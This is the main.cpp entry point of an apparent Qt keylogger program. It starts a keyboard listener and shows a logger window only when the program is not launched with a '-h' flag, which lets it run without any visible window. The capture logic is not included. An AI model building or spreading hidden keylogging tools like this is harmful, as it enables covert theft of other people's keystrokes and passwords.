#include "main.h"
#include "keyloggerwindow.h"
#include "keyboardlistener.h"
#include <QApplication>
KeyboardListener* Main::keyboardListener;
int main(int argc, char *argv[])
{
	QApplication a(argc, argv);
    Main::keyboardListener = new KeyboardListener();
    qDebug() << qApp->arguments() << qApp->arguments().contains("-h");
    KeyLoggerWindow* w;
    if(!qApp->arguments().contains("-h")) {
        w = new KeyLoggerWindow();
        w->show();
    }

	return a.exec();
}
